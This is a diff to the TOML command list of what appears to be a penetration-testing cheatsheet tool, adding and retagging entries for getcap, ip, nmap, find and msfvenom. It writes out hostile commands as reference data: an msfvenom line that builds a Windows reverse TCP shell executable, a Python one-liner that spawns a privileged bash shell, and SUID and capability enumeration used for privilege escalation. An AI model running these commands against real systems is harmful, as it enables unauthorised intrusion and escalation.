@@ -41,6 +41,24 @@ name_exe = "python3"
 cmd_types = "sysadmin"
 explanation = "Upgrade shell for more flexibility"
 args = "-c 'import os; os.system(\"/bin/bash -p\")'"
+[command.capabilities0]
+name_exe = "getcap"
+cmd_types = "sysadmin"
+explanation = "Search binaries with capabilities (often require sudo)"
+args = "-r / 2>/dev/null"
+examples = [
+    "sudo getcap -r / 2>/dev/null",
+    "sudo getcap /usr/bin/ping"
+]
+[command.ip0]
+name_exe = "ip"
+cmd_types = "sysadmin"
+explanation = "Put up/down an interface"
+args = "link set dev <interface> <status|down>"
+examples = [
+    "link set dev eth0 down",
+    "link set dev eth0 up"
+]
 
 # ===== PENTEST COMMANDS =====
 [command.nmap0]
@@ -53,7 +71,7 @@ examples = [
 ]
 [command.nmap1]
 name_exe = "nmap"
-cmd_types = "pentest"
+cmd_types = "pentest|network"
 explanation = "Version -sV, default script -sC"
 args = "-sC -sV <ip|127.0.0.1>"
 examples = [
@@ -85,11 +103,19 @@ examples = [
 ]
 [command.find0]
 name_exe = "find"
-cmd_types = "pentest"
+cmd_types = "pentest|sysadmin"
 explanation = "Find binaries with SUID bit set"
 args = "/ -perm -4000 2> /dev/null"
 examples = [
     "find / -perm -4000 2> /dev/null"
+]
+[command.msfvenom0]
+name_exe = "msfvenom"
+cmd_types = "pentest"
+explanation = "Create reverse shell tcp"
+args = "-p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
+examples = [
+    "-p payload|windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > reverse_tcp.exe"
 ]
 
 
